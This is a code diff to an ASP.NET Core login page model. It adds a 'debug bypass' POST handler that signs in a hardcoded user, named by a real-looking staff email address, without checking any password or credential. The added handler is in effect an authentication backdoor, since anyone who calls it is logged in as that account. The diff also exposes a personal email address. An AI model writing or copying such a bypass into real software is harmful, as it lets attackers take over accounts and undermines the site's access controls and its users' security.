@@ -160,4 +160,17 @@ public class LoginModel : PageModel
         // Redirect to home page
         return LocalRedirect(Url.Content("~/"));
     }
+
+    public async Task<IActionResult> OnPostDebugBypassAsync()
+    {
+        _logger.LogInformation($"Starting Login Attempt using Debug Process");
+
+        var user = await _userManager.FindByEmailAsync("benjamin.hillsley@det.nsw.edu.au");
+
+        await _userManager.UpdateSecurityStampAsync(user);
+
+        await _signInManager.SignInAsync(user, false);
+
+        return LocalRedirect(Url.Content("~/"));
+    }
 }
